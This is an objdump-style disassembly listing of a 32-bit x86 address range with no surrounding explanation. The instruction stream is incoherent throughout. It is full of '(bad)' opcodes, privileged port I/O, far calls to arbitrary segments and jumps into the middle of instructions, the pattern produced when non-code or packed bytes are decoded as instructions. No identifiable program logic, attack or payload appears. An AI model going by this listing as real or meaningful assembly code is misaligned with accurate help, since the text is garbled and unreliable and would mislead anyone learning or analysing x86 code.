  40e587:	sub    ebp,0xffffffa4
  40e58a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e58b:	sub    DWORD PTR [ebp-0x56],ebx
  40e58e:	retf   
  40e58f:	jbe    0x40e58e
  40e591:	pop    ecx
  40e592:	fistp  QWORD PTR [edx]
  40e594:	dec    edx
  40e595:	push   DWORD PTR [ecx]
  40e597:	mov    edx,DWORD PTR [ebx+0x5e1cd91f]
  40e59d:	pop    ebx
  40e59e:	push   edi
  40e59f:	sbb    edi,DWORD PTR [edx-0x5c]
  40e5a2:	dec    esi
  40e5a3:	xor    DWORD PTR [eax+0x5d],ecx
  40e5a6:	or     DWORD PTR [ecx-0x1e33524a],esi
  40e5ac:	jb     0x40e5a5
  40e5ae:	ficomp WORD PTR [ecx+0x3a9047c5]
  40e5b4:	fbld   TBYTE PTR [edx-0x72]
  40e5b7:	xor    BYTE PTR [ecx-0x49],bl
  40e5ba:	pop    edi
  40e5bb:	dec    edx
  40e5bc:	add    eax,DWORD PTR [ebx]
  40e5be:	outs   dx,DWORD PTR ds:[esi]
  40e5bf:	nop
  40e5c0:	push   es
  40e5c1:	arpl   WORD PTR [ebx+0x235611a],dx
  40e5c7:	jl     0x40e599
  40e5c9:	push   edi
  40e5ca:	in     eax,dx
  40e5cb:	and    esi,DWORD PTR [edi+0x2762ad49]
  40e5d1:	inc    ebx
  40e5d2:	jb     0x40e5e3
  40e5d4:	lea    ebp,[edx+ebp*4]
  40e5d7:	adc    al,0x93
  40e5d9:	ins    DWORD PTR es:[edi],dx
  40e5da:	call   0x93b893f1
  40e5df:	push   0x8871a625
  40e5e4:	xchg   edx,eax
  40e5e5:	imul   esp,DWORD PTR [eax],0xcd93ab99
  40e5eb:	std    
  40e5ec:	aas    
  40e5ed:	xor    BYTE PTR [edx],dl
  40e5ef:	adc    al,0xf7
  40e5f1:	ret    
  40e5f2:	push   ebx
  40e5f3:	xchg   ebp,eax
  40e5f4:	imul   eax,ebx,0x4d
  40e5f7:	pop    ebp
  40e5f8:	mov    eax,0x2ec9114c
  40e5fd:	mov    DWORD PTR [esi],ebx
  40e5ff:	addr16 imul ebx,edx,0xffffffbc
  40e603:	jb     0x40e62b
  40e605:	inc    ebx
  40e606:	push   0xfffffff7
  40e608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e609:	sub    eax,0x25530d99
  40e60e:	test   DWORD PTR [esi+0x729385b0],edx
  40e614:	sar    al,0x7e
  40e617:	push   ebx
  40e618:	jb     0x40e64e
  40e61a:	dec    edx
  40e61b:	cmp    ebx,DWORD PTR [edi]
  40e61d:	out    dx,al
  40e61e:	mov    ch,0x8c
  40e620:	mov    edi,DWORD PTR [eax-0x37]
  40e623:	inc    ebx
  40e624:	xlat   BYTE PTR ds:[ebx]
  40e625:	pop    edi
  40e626:	fst    QWORD PTR [esi+0x7ac8cb16]
  40e62c:	jp     0x40e68b
  40e62e:	(bad)  [esi-0x47afb297]
  40e634:	inc    edx
  40e635:	sbb    eax,0xc1cd85da
  40e63a:	and    edi,ebx
  40e63c:	out    dx,al
  40e63d:	and    DWORD PTR [edx+0x7f],eax
  40e640:	cld    
  40e641:	mov    dl,0xef
  40e643:	xor    eax,DWORD PTR [ebp+0x2a]
  40e646:	in     eax,0xad
  40e648:	jg     0x40e67e
  40e64a:	sbb    bh,dh
  40e64c:	pop    ebx
  40e64d:	loop   0x40e640
  40e64f:	push   0xa98eba72
  40e654:	or     bh,0x76
  40e657:	pop    ecx
  40e658:	rol    BYTE PTR [ebp+0x30],1
  40e65b:	add    cl,BYTE PTR [ebx+edi*8]
  40e65e:	adc    al,0x33
  40e660:	push   ss
  40e661:	sbb    DWORD PTR [ebp+0x70],edi
  40e664:	outs   dx,DWORD PTR ds:[esi]
  40e665:	mov    ds:0x332e56d3,al
  40e66a:	inc    esp
  40e66b:	fcom   DWORD PTR [edi+0x73]
  40e66e:	out    dx,al
  40e66f:	inc    ebp
  40e670:	pushf  
  40e671:	inc    edx
  40e672:	mov    bl,0xb2
  40e674:	pushf  
  40e675:	and    al,0xa1
  40e677:	imul   edi,DWORD PTR [ebx-0x475a2d04],0xd2a1e107
  40e681:	sti    
  40e682:	push   esp
  40e683:	and    DWORD PTR [eax+0x17],0x262de1db
  40e68a:	shr    DWORD PTR [edi],0x4d
  40e68d:	repnz mov ch,0x99
  40e690:	push   0xc
  40e692:	nop
  40e693:	mov    eax,ds:0xa8fd2584
  40e698:	adc    edx,DWORD PTR [esi+ecx*8+0x35]
  40e69c:	jnp    0x40e6eb
  40e69e:	sub    ecx,DWORD PTR [eax+0x3a]
  40e6a1:	movsx  ebp,bx
  40e6a4:	pop    ss
  40e6a5:	stos   DWORD PTR es:[edi],eax
  40e6a6:	mov    esp,0x994c5ea8
  40e6ab:	pop    es
  40e6ac:	pop    ebp
  40e6ad:	push   esp
  40e6ae:	jbe    0x40e66b
  40e6b0:	retf   
  40e6b1:	adc    eax,0x42ea13da
  40e6b6:	pop    es
  40e6b7:	push   ecx
  40e6b8:	icebp  
  40e6b9:	inc    esi
  40e6ba:	xor    al,0xc6
  40e6bc:	div    BYTE PTR [esi+0x57]
  40e6bf:	hlt    
  40e6c0:	xlat   BYTE PTR ds:[ebx]
  40e6c1:	dec    edx
  40e6c2:	in     al,dx
  40e6c3:	popf   
  40e6c4:	cmp    ch,0x8a
  40e6c7:	inc    ebx
  40e6c8:	hlt    
  40e6c9:	test   eax,0x4bf10241
  40e6ce:	inc    eax
  40e6cf:	inc    esp
  40e6d0:	mov    ch,0x23
  40e6d2:	pop    es
  40e6d3:	or     ah,BYTE PTR cs:[ecx]
  40e6d6:	dec    ecx
  40e6d7:	xchg   ebx,eax
  40e6d8:	fstp   TBYTE PTR [edx+0xb8cfa0a]
  40e6de:	adc    ecx,ebp
  40e6e0:	scas   eax,DWORD PTR es:[edi]
  40e6e1:	cmp    cl,BYTE PTR [eax]
  40e6e3:	xor    BYTE PTR [ecx+0xd497f1d],dh
  40e6e9:	xor    dl,al
  40e6eb:	enter  0x24af,0x2b
  40e6ef:	mov    bh,0xf9
  40e6f1:	wbinvd 
  40e6f3:	lock ret 0xc526
  40e6f7:	in     al,dx
  40e6f8:	push   ebp
  40e6f9:	jg     0x40e6a1
  40e6fb:	xor    al,0x0
  40e6fd:	stc    
  40e6fe:	shl    DWORD PTR [eax-0x2eacb0d4],0x66
  40e705:	in     eax,dx
  40e706:	test   ah,0x8f
  40e709:	sub    ah,BYTE PTR [esi]
  40e70b:	ins    BYTE PTR es:[edi],dx
  40e70c:	push   edx
  40e70d:	pop    ecx
  40e70e:	xchg   ebx,eax
  40e70f:	ror    BYTE PTR [ecx+esi*8+0x6932225e],cl
  40e716:	push   eax
  40e717:	aaa    
  40e718:	into   
  40e719:	loop   0x40e708
  40e71b:	daa    
  40e71c:	aaa    
  40e71d:	fmul   DWORD PTR [edx+0x6a]
  40e720:	sti    
  40e721:	icebp  
  40e722:	mov    ah,0xc8
  40e724:	jle    0x40e77f
  40e726:	rol    BYTE PTR [ebx+0xc],cl
  40e729:	loope  0x40e779
  40e72b:	fistp  QWORD PTR [ebx+0x7ce5906]
  40e731:	ins    DWORD PTR es:[edi],dx
  40e732:	xchg   esi,eax
  40e733:	(bad)  [edi+0x923567d]
  40e739:	dec    ebp
  40e73a:	or     ch,al
  40e73c:	cmp    DWORD PTR [edx-0x45],edx
  40e73f:	in     eax,dx
  40e740:	or     esp,eax
  40e742:	pop    ecx
  40e743:	mov    edi,0x126e8a19
  40e748:	mov    al,ds:0x324be9d6
  40e74d:	pop    eax
  40e74e:	xchg   ebp,eax
  40e74f:	jne    0x40e7a8
  40e751:	mov    eax,ds:0xf14f60ba
  40e756:	js     0x40e790
  40e758:	inc    DWORD PTR [ecx+0x71b2dbe5]
  40e75e:	not    BYTE PTR [edi-0xe6ab5be]
  40e764:	retf   
  40e765:	out    0xd4,al
  40e767:	and    eax,0x8d4b4465
  40e76c:	xchg   DWORD PTR [ebp-0x18832d5d],ebp
  40e772:	rol    BYTE PTR [eax+0x2b7d5af9],cl
  40e778:	inc    eax
  40e779:	add    eax,esi
  40e77b:	xchg   edx,eax
  40e77c:	lock shl cl,cl
  40e77f:	mov    edi,0xf0e711fd
  40e784:	test   DWORD PTR [ebx-0x7b],ebp
  40e787:	(bad)  [ecx-0x58d855bc]
  40e78d:	out    dx,eax
  40e78e:	push   ebp
  40e78f:	cli    
  40e790:	in     eax,dx
  40e791:	inc    edi
  40e792:	not    DWORD PTR [ebx+0x1dcffe34]
  40e798:	inc    ebp
  40e799:	add    edi,ebp
  40e79b:	lods   eax,DWORD PTR ds:[esi]
  40e79c:	push   esp
  40e79d:	(bad)  
  40e79f:	mov    ch,0x30
  40e7a1:	pushf  
  40e7a2:	fwait
  40e7a3:	sar    ebx,0x37
  40e7a6:	mov    al,0x53
  40e7a8:	or     DWORD PTR [edi+0x61],ebx
  40e7ab:	add    al,0x52
  40e7ad:	sub    DWORD PTR [edx-0x58240999],0x4
  40e7b4:	fisttp QWORD PTR [eax-0x76cda01f]
  40e7ba:	jp     0x40e7ed
  40e7bc:	hlt    
  40e7bd:	leave  
  40e7be:	pop    eax
  40e7bf:	mov    bh,0x56
  40e7c1:	jle    0x40e7c5
  40e7c3:	or     BYTE PTR [ebx+0x353a5b85],al
  40e7c9:	inc    esi
  40e7ca:	mov    cl,0xd5
  40e7cc:	inc    BYTE PTR [edx]
  40e7ce:	stc    
  40e7cf:	or     bh,BYTE PTR [edx+0x4c3805aa]
  40e7d5:	inc    ecx
  40e7d6:	jg     0x40e82d
  40e7d8:	mov    al,ds:0xdf6b47db
  40e7dd:	push   esi
  40e7de:	inc    edx
  40e7df:	xor    BYTE PTR [ebp+eiz*8-0x52],dh
  40e7e3:	adc    bh,0x86
  40e7e6:	and    al,0xd0
  40e7e8:	xor    al,0x1d
  40e7eb:	mov    ebx,0x99663dd4
  40e7f0:	sbb    eax,0xa1a68d98
  40e7f5:	sar    BYTE PTR [esi+0x10dfd09e],1
  40e7fb:	stos   BYTE PTR es:[edi],al
  40e7fc:	out    dx,eax
  40e7fd:	add    eax,0x7a44696e
  40e802:	out    0xad,al
  40e804:	pop    esp
  40e805:	fdiv   DWORD PTR [edi+ecx*8+0x77]
  40e809:	pop    ds
  40e80a:	rcl    BYTE PTR ds:0x3bb283f9,1
  40e810:	iret   
  40e811:	jp     0x40e832
  40e813:	aam    0x2f
  40e815:	dec    esi
  40e816:	mov    bl,0x49
  40e818:	xchg   BYTE PTR [ecx],dl
  40e81a:	ins    DWORD PTR es:[edi],dx
  40e81b:	xor    DWORD PTR [edi+0x6b94babb],0x2fdf4ee5
  40e825:	js     0x40e7e7
  40e827:	pop    ecx
  40e828:	mov    bh,0x52
  40e82a:	outs   dx,BYTE PTR ds:[esi]
  40e82b:	dec    esp
  40e82c:	out    dx,al
  40e82d:	xchg   edi,eax
  40e82e:	fiadd  DWORD PTR [edx]
  40e830:	loope  0x40e825
  40e832:	in     al,0xca
  40e834:	inc    ecx
  40e835:	rcl    DWORD PTR gs:[eax+0x3a37afe3],0x4c
  40e83d:	xor    al,0x91
  40e83f:	push   0x4f4e366e
  40e844:	pop    es
  40e845:	mov    edi,DWORD PTR [eax+0x6dc32df7]
  40e84b:	push   ds
  40e84c:	cmp    DWORD PTR [edx+0x57],ebp
  40e84f:	cli    
  40e850:	fst    QWORD PTR [esi]
  40e852:	out    0xbf,eax
  40e854:	pop    ebp
  40e855:	mov    ah,0x14
  40e857:	hlt    
  40e858:	mov    ds:0xc0fcfb7c,al
  40e85d:	jbe    0x40e8cf
  40e85f:	push   edx
  40e860:	hlt    
  40e861:	lods   al,BYTE PTR ds:[esi]
  40e862:	mov    eax,0xc079505a
  40e867:	push   cs
  40e868:	out    0x9a,al
  40e86a:	mov    cl,0x54
  40e86c:	xor    ebp,0x19fee7d1
  40e872:	int3   
  40e873:	jnp    0x40e85e
  40e875:	fld    QWORD PTR [esi]
  40e877:	jmp    0xd45e:0x716e3493
  40e87e:	push   eax
  40e87f:	cmp    DWORD PTR [ebp+0x22],esp
  40e882:	or     eax,0x57f977ae
  40e887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e888:	dec    ebp
  40e889:	pop    edi
  40e88a:	stos   BYTE PTR es:[edi],al
  40e88b:	test   eax,0xc25fe0a3
  40e890:	jnp    0x40e841
  40e892:	ret    
  40e893:	in     eax,0x74
  40e895:	aas    
  40e896:	in     eax,dx
  40e897:	and    BYTE PTR [ebx-0x41],ah
  40e89a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e89b:	cmp    DWORD PTR [ebx+0x3dc7e2a1],0x14abcfe6
  40e8a5:	dec    ebx
  40e8a6:	xchg   edx,eax
  40e8a7:	call   0xc510:0x6c7fd712
  40e8ae:	jecxz  0x40e918
  40e8b0:	enter  0xc77f,0x42
  40e8b4:	std    
  40e8b5:	inc    esp
  40e8b6:	popa   
  40e8b7:	mov    al,BYTE PTR [ebp+0x7eab2a0c]
  40e8bd:	lds    eax,FWORD PTR [edi+0x2c]
  40e8c0:	call   0xe1a2:0xf2b5bb42
  40e8c7:	lahf   
  40e8c8:	es ins DWORD PTR es:[edi],dx
  40e8ca:	je     0x40e889
  40e8cc:	mov    eax,0x12b7d2b6
  40e8d1:	sbb    eax,0x472c9f9a
  40e8d6:	pop    DWORD PTR [eax-0xfbff5d4]
  40e8dc:	js     0x40e8d9
  40e8de:	mov    ebx,0x544b75b0
  40e8e3:	mov    bh,0x26
  40e8e5:	inc    edi
  40e8e6:	pop    eax
  40e8e7:	push   0x39
  40e8e9:	popf   
  40e8ea:	pop    es
  40e8eb:	add    DWORD PTR [ebx+0x33],esi
  40e8ee:	aaa    
  40e8ef:	xor    DWORD PTR [ecx-0x58],eax
  40e8f2:	call   0xdf166bf3
  40e8f7:	fimul  WORD PTR [esi]
  40e8f9:	lods   al,BYTE PTR ds:[esi]
  40e8fa:	icebp  
  40e8fb:	add    eax,0x90607de3
  40e900:	cmp    DWORD PTR [ebp+0x41],ebp
  40e903:	dec    edi
  40e904:	mov    edi,0x145c0bb7
  40e909:	std    
  40e90a:	cmp    ebp,DWORD PTR ds:0x31d49488
  40e910:	mov    dh,0xee
  40e912:	mov    esp,0x74f1badb
  40e917:	(bad)  
  40e918:	imul   edx,DWORD PTR [esi+edi*4+0x36],0x4e
  40e91d:	adc    edi,ebx
  40e91f:	jbe    0x40e8e6
  40e921:	shl    DWORD PTR [ecx-0x16],cl
  40e924:	scas   al,BYTE PTR es:[edi]
  40e925:	jle    0x40e990
  40e927:	(bad)  
  40e928:	fistp  WORD PTR [esi+esi*4+0x10]
  40e92c:	(bad)  
  40e92e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e92f:	push   ss
  40e930:	pop    ebx
  40e931:	xchg   esp,eax
  40e932:	pop    ss
  40e933:	dec    ebx
  40e934:	imul   edi,esp,0xffffffec
  40e937:	fwait
  40e938:	or     al,0x4e
  40e93a:	fdiv   DWORD PTR [ebx+0x1e]
  40e93d:	call   0x143bcb54
  40e942:	pushf  
  40e943:	inc    ecx
  40e944:	push   ecx
  40e945:	mov    ebx,0xb2e37980
  40e94a:	js     0x40e8f0
  40e94c:	psubsw mm5,QWORD PTR [ecx]
  40e94f:	aaa    
  40e950:	les    esp,FWORD PTR [ebx+0x6e367d7b]
  40e956:	enter  0xe313,0x7e
  40e95a:	jmp    0x5a84:0x49f17a32
  40e961:	push   ss
  40e962:	lahf   
  40e963:	xchg   ecx,eax
  40e964:	or     edi,DWORD PTR [edi+0x40]
  40e967:	ds pop ebp
  40e969:	push   ss
  40e96a:	push   esp
  40e96b:	sbb    edi,edx
  40e96d:	imul   DWORD PTR [eax+ebx*2+0x42534530]
  40e974:	sbb    eax,DWORD PTR [bx+0x3653]
  40e979:	rcl    BYTE PTR [edx+0x68],0xb5
  40e97d:	jns    0x40e9ce
  40e97f:	lods   eax,DWORD PTR ds:[esi]
  40e980:	mov    ebp,DWORD PTR [ebx]
  40e982:	test   al,0x71
  40e984:	add    cl,BYTE PTR [esi+0x1eeb29fc]
  40e98a:	fstp   TBYTE PTR [ecx+edi*8]
  40e98d:	pop    esi
  40e98e:	rcr    dl,0xb0
  40e991:	(bad)  
  40e992:	mov    BYTE PTR [esi+ebp*4],dh
  40e995:	out    dx,al
  40e996:	add    eax,0xf7753d7a
  40e99b:	fistp  QWORD PTR fs:[ecx+ecx*1]
  40e99f:	scas   al,BYTE PTR es:[edi]
  40e9a0:	in     al,0x48
  40e9a2:	(bad)  
  40e9a3:	sub    DWORD PTR [ebp+0x69],eax
  40e9a6:	cli    
  40e9a7:	mov    BYTE PTR [ebp+ecx*8+0x13],bh
  40e9ab:	xor    cl,BYTE PTR [eax+0x6b]
  40e9ae:	or     al,0xf2
  40e9b0:	out    0xfd,al
  40e9b2:	repnz cld 
  40e9b4:	out    dx,eax
  40e9b5:	out    dx,eax
  40e9b6:	ja     0x40e9c8
  40e9b8:	pushf  
  40e9b9:	jae    0x40e948
  40e9bb:	jns    0x40e95c
  40e9bd:	lahf   
  40e9be:	xchg   BYTE PTR [edx+0x68],bl
  40e9c1:	leave  
  40e9c2:	jb     0x40e98b
  40e9c4:	sub    ch,bh
  40e9c6:	xchg   esi,eax
  40e9c7:	dec    ebp
  40e9c8:	mov    al,ds:0xf94fbe06
  40e9cd:	test   al,0x28
  40e9cf:	(bad)  
  40e9d0:	rcl    BYTE PTR [edi+0x27e5aa45],1
  40e9d6:	jg     0x40e996
  40e9d8:	not    ch
  40e9da:	test   DWORD PTR [edx-0x29],ebx
  40e9dd:	retf   0xa4c9
  40e9e0:	push   ecx
  40e9e1:	jl     0x40ea3f
  40e9e3:	jbe    0x40ea1e
  40e9e5:	cmp    dh,bh
  40e9e7:	sahf   
  40e9e8:	aas    
  40e9e9:	inc    edx
  40e9ea:	pop    esp
  40e9eb:	mov    dh,0x48
  40e9ed:	sbb    al,0x37
  40e9ef:	push   0xffffffcc
  40e9f1:	fstp   DWORD PTR [eax+0x37]
  40e9f4:	in     eax,dx
  40e9f5:	sbb    BYTE PTR [eax-0x259de58a],ah
  40e9fb:	xchg   ecx,eax
  40e9fc:	fs push edx
  40e9fe:	call   0xf7f:0x418a88b7
  40ea05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea06:	sub    ch,ah
  40ea08:	call   0xeaab508a
  40ea0d:	in     eax,0x7
  40ea0f:	inc    edx
  40ea10:	stos   BYTE PTR es:[edi],al
  40ea11:	rcr    DWORD PTR [edx],cl
  40ea13:	lock or al,0x62
  40ea16:	dec    esp
  40ea17:	add    ecx,ebx
  40ea19:	leave  
  40ea1a:	push   esp
  40ea1b:	cmp    esp,DWORD PTR [ecx]
  40ea1d:	push   edi
  40ea1e:	dec    esp
  40ea1f:	shl    BYTE PTR [eax-0x455a213f],cl
  40ea25:	rol    edx,1
  40ea27:	pop    esi
  40ea28:	imul   edx,DWORD PTR [edx+edi*1],0x27
  40ea2c:	lea    ecx,[ebp-0x3519fe6a]
  40ea32:	mov    esp,0x30c928a4
  40ea37:	and    BYTE PTR ds:0x5a25d445,dh
  40ea3d:	mov    cl,0x5f
  40ea3f:	imul   edi,DWORD PTR ds:0x23203a96,0xd8d256bc
  40ea49:	shl    DWORD PTR [esi+eiz*1+0x5f],1
  40ea4d:	lock or eax,0x6c86bf6d
  40ea53:	xor    DWORD PTR [edi+0xc],ebp
  40ea56:	xlat   BYTE PTR ds:[ebx]
  40ea57:	and    eax,0xa163840a
  40ea5c:	pop    esp
  40ea5d:	iret   
  40ea5e:	cs and al,0x74
  40ea61:	dec    edx
  40ea62:	js     0x40ea74
  40ea64:	je     0x40ea6c
  40ea66:	pop    esi
  40ea67:	fld    QWORD PTR [edx-0x4]
  40ea6a:	mov    ah,0x2a
  40ea6c:	(bad)  
  40ea6e:	mov    ecx,DWORD PTR [ecx+ebp*4]
  40ea71:	or     DWORD PTR [edi+0x47ff166e],esi
  40ea77:	adc    eax,0x729e98cb
  40ea7c:	js     0x40ea1a
  40ea7e:	cwde   
  40ea7f:	and    BYTE PTR [eax+0x41],0x2c
  40ea83:	popa   
  40ea84:	or     ch,al
  40ea86:	dec    edi
  40ea87:	push   esp
  40ea88:	mov    ds:0xac6213b5,eax
  40ea8d:	dec    ebx
  40ea8e:	jmp    0xf7bc:0xbab275f4
  40ea95:	and    eax,0x2b67cce2
  40ea9a:	in     eax,dx
  40ea9b:	pop    ecx
  40ea9c:	(bad)
  40ea9f:	mov    al,ds:0xc46941d4
  40eaa4:	scas   al,BYTE PTR es:[edi]
  40eaa5:	dec    eax
  40eaa6:	out    dx,al
  40eaa7:	stos   BYTE PTR es:[edi],al
  40eaa8:	mov    ecx,0x26607772
  40eaad:	mov    ch,bl
  40eaaf:	ret    0x21bd
  40eab2:	mov    al,0xd3
  40eab4:	fmul   DWORD PTR [edi]
  40eab6:	lock sub al,BYTE PTR [edx+eax*8]
  40eaba:	stc    
  40eabb:	push   esi
  40eabc:	sbb    al,0xe5
  40eabe:	push   edx
  40eabf:	pop    edx
  40eac0:	jns    0x40ea81
  40eac2:	aam    0xa0
  40eac4:	mov    bl,0xa9
  40eac6:	or     al,0xa5
  40eac8:	mov    bl,0xa4
  40eaca:	sub    eax,0xfdad0a9d
  40eacf:	test   DWORD PTR [eax-0x47],ebp
  40ead2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ead3:	aad    0xc2
  40ead5:	mov    bh,al
  40ead7:	aaa    
  40ead8:	jle    0x40ea7b
  40eada:	xor    ebp,DWORD PTR [ebp-0x1f2092ad]
  40eae0:	xchg   esi,eax
  40eae1:	out    0xd8,eax
  40eae3:	fxch   st(1)
  40eae5:	push   0xffffffa3
  40eae7:	shr    BYTE PTR [ebp-0x60],cl
  40eaea:	lea    eax,[eax]
  40eaec:	outs   dx,BYTE PTR ds:[esi]
  40eaed:	sub    al,0xe0
  40eaef:	push   es
  40eaf0:	jno    0x40eb68
  40eaf2:	ret    
  40eaf3:	mov    esp,0xe5f45854
  40eaf8:	aaa    
  40eaf9:	add    ecx,DWORD PTR [esi]
  40eafb:	call   0x59a8:0xa14a77b7
  40eb02:	push   ebp
  40eb03:	dec    eax
  40eb04:	loope  0x40eb37
  40eb06:	jg     0x40eaae
  40eb08:	xchg   edi,eax
  40eb09:	jb     0x40ead7
  40eb0b:	push   es
  40eb0c:	int3   
  40eb0d:	lods   al,BYTE PTR ds:[esi]
  40eb0e:	jne    0x40eafa
  40eb10:	in     al,dx
  40eb11:	pop    esp
  40eb12:	and    BYTE PTR [eax-0x2c45ae38],dl
  40eb18:	in     eax,0xaf
  40eb1a:	ja     0x40eb69
  40eb1c:	adc    eax,0x665120b8
  40eb21:	xchg   ecx,eax
  40eb22:	imul   ecx,ebp,0x37
  40eb25:	push   esi
  40eb26:	lods   al,BYTE PTR ds:[esi]
  40eb27:	push   ds
  40eb28:	push   edx
  40eb29:	sti    
  40eb2a:	cli    
  40eb2b:	sub    eax,0xdd109b35
  40eb30:	sar    BYTE PTR ss:[edx],0xdc
  40eb34:	adc    DWORD PTR [esi-0x7ce1c97c],ebp
  40eb3a:	rcl    DWORD PTR [edi-0xdca902f],0xf4
  40eb41:	jl     0x40eba5
  40eb43:	mov    ds:0xba688f8,al
  40eb48:	or     eax,DWORD PTR [edx+0x69d902d4]
  40eb4e:	push   es
  40eb4f:	inc    ebx
  40eb50:	mov    esi,0x61aba9d5
  40eb55:	or     BYTE PTR [ebp+0x2fd5ab47],ch
  40eb5b:	push   ebx
  40eb5c:	mov    dl,0x8e
  40eb5e:	mov    ebx,0x61f998e2
  40eb63:	mov    ds:0x5e6b85a4,eax
  40eb68:	pop    ss
  40eb69:	scas   al,BYTE PTR es:[edi]
  40eb6a:	mov    bl,0x89
  40eb6c:	adc    ebx,DWORD PTR [ebp-0x55ec12ad]
  40eb72:	and    BYTE PTR [esi],0x22
  40eb75:	ins    DWORD PTR es:[edi],dx
  40eb76:	and    al,0x82
  40eb78:	inc    esp
  40eb79:	mov    DWORD PTR [ebx+0x2aa03a83],ebp
  40eb7f:	jne    0x40ebf5
  40eb81:	mov    ebx,DWORD PTR [ebp-0x5185dcb8]
  40eb87:	leave  
  40eb88:	mov    esi,0x14c84e83
  40eb8d:	lds    esi,FWORD PTR es:[edx+ebx*2-0x7d1c8965]
  40eb95:	sbb    ebp,DWORD PTR [ecx-0x7]
  40eb98:	jp     0x40ebd3
  40eb9a:	into   
  40eb9b:	mov    edx,0xd31c8334
  40eba0:	xor    BYTE PTR ds:0xf9204b1f,cl
  40eba6:	in     eax,dx
  40eba7:	(bad)  
  40eba9:	test   al,0xd9
  40ebab:	sbb    eax,DWORD PTR [ebx]
  40ebad:	fld    QWORD PTR [eax+0x5b]
  40ebb0:	and    eax,0xce38b030
  40ebb5:	pop    ebx
  40ebb6:	dec    eax
  40ebb7:	cmp    eax,0xa08a29fc
  40ebbc:	push   0x59fa1d69
  40ebc1:	call   0x8b9c:0x91502d96
  40ebc8:	push   eax
  40ebc9:	lahf   
  40ebca:	std    
  40ebcb:	or     ebp,DWORD PTR [edi+ebx*2]
  40ebce:	fidivr WORD PTR [edi-0x64622aaf]
  40ebd4:	mov    fs,ecx
  40ebd6:	loope  0x40ebcf
  40ebd8:	enter  0x29e5,0x39
  40ebdc:	mov    esp,0xe6253094
  40ebe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe2:	ret    
  40ebe3:	ins    BYTE PTR es:[edi],dx
  40ebe4:	ins    DWORD PTR es:[edi],dx
  40ebe5:	push   esi
  40ebe6:	imul   ebx,DWORD PTR [ebx-0x35],0x9f47f2e7
  40ebed:	bound  esp,QWORD PTR [eax]
  40ebef:	mov    eax,0x355f6e8
  40ebf4:	lahf   
  40ebf5:	stc    
  40ebf6:	scas   eax,DWORD PTR es:[edi]
  40ebf7:	sub    BYTE PTR [eax-0x77],al
  40ebfa:	test   BYTE PTR [ebx-0x66],bl
  40ebfd:	mov    eax,0xef86d02d
  40ec02:	pop    edx
  40ec03:	cmc    
  40ec04:	sub    DWORD PTR [ecx],ecx
  40ec06:	rcl    DWORD PTR [ecx+0x40],0xfa
  40ec0a:	mov    bl,0x1b
  40ec0c:	ret    0xbb27
  40ec0f:	stos   DWORD PTR es:[edi],eax
  40ec10:	mov    dh,BYTE PTR [edx]
  40ec12:	gs dec edi
  40ec14:	xchg   BYTE PTR [eax+ecx*4-0x66],ah
  40ec18:	or     al,0xf9
  40ec1a:	inc    esi
  40ec1b:	js     0x40ebfa
  40ec1d:	lock ror BYTE PTR [ebx+esi*8-0x18b00349],1
  40ec25:	test   al,0x1
  40ec27:	retf   0xe9ff
  40ec2a:	mov    DWORD PTR [edx],ecx
  40ec2c:	ins    DWORD PTR es:[edi],dx
  40ec2d:	xor    BYTE PTR [edi+0xeca644e],0xec
  40ec34:	imul   edx,DWORD PTR [edi],0x4d2b77d4
  40ec3a:	dec    eax
  40ec3b:	stos   DWORD PTR es:[edi],eax
  40ec3c:	std    
  40ec3d:	rcl    DWORD PTR ds:0x80d3f6d9,0xac
  40ec44:	fwait
  40ec45:	int    0x7e
  40ec47:	and    al,0xb7
  40ec49:	rol    DWORD PTR [edx],0x53
  40ec4c:	pop    ss
  40ec4d:	int    0x23
  40ec4f:	add    ah,BYTE PTR [ecx]
  40ec51:	div    DWORD PTR [eax+0x6]
  40ec54:	outs   dx,BYTE PTR ds:[esi]
  40ec55:	jmp    0x40ec5c
  40ec57:	popa   
  40ec58:	jle    0x40ebdf
  40ec5a:	inc    eax
  40ec5b:	push   ecx
  40ec5c:	or     eax,0x9527f968
  40ec61:	(bad)  
  40ec62:	mov    BYTE PTR [ecx-0x5f],ch
  40ec65:	push   ecx
  40ec66:	sub    al,0xf
  40ec68:	jmp    0x5fefca3e
  40ec6d:	xchg   ebp,eax
  40ec6e:	pop    ebp
  40ec6f:	cmc    
  40ec70:	aaa    
  40ec71:	ret    
  40ec72:	ds xchg edi,eax
  40ec74:	dec    edi
  40ec75:	pop    edx
  40ec76:	push   ecx
  40ec77:	pop    edi
  40ec78:	adc    dl,ch
  40ec7a:	dec    eax
  40ec7b:	push   ss
  40ec7c:	sub    eax,0xf3271fa6
  40ec81:	mov    bh,0xe5
  40ec83:	add    eax,0x1c0aca7b
  40ec88:	mov    ebp,0x78d4e017
  40ec8d:	mul    BYTE PTR [ebp-0x6]
  40ec90:	das    
  40ec91:	outs   dx,BYTE PTR ds:[esi]
  40ec92:	and    eax,0x933dd919
	...
  40ed13:	add    BYTE PTR [edx-0x11c51bc],dl
  40ed19:	jmp    0x40ecfa
  40ed1b:	jne    0x40ed80
  40ed1d:	pop    ecx
  40ed1e:	jmp    0x16f2:0x61f601d
  40ed25:	call   0x0:0x76b0000
  40ed2c:	lea    esp,[ebx+0x68dfb753]
  40ed32:	inc    ebx
  40ed33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed34:	lock test al,0x3c
  40ed37:	cmp    al,0xb9
  40ed39:	rep lods eax,DWORD PTR ds:[esi]
  40ed3b:	stc    
  40ed3c:	test   DWORD PTR [edi],edx
  40ed3e:	div    BYTE PTR [ebp-0x6b]
  40ed41:	cmp    dh,bh
  40ed43:	push   0x68
  40ed45:	and    al,BYTE PTR [edx-0x3136f01f]
  40ed4b:	sub    bl,cl
  40ed4d:	test   BYTE PTR [ebp-0x6d8ce831],bh
  40ed53:	cmp    bl,bh
  40ed55:	jle    0x40ecdb
  40ed57:	je     0x40ed17
  40ed59:	or     esp,esi
  40ed5b:	inc    edi
  40ed5c:	in     al,0x8
  40ed5e:	jle    0x40edb9
  40ed60:	in     al,dx
  40ed61:	pusha  
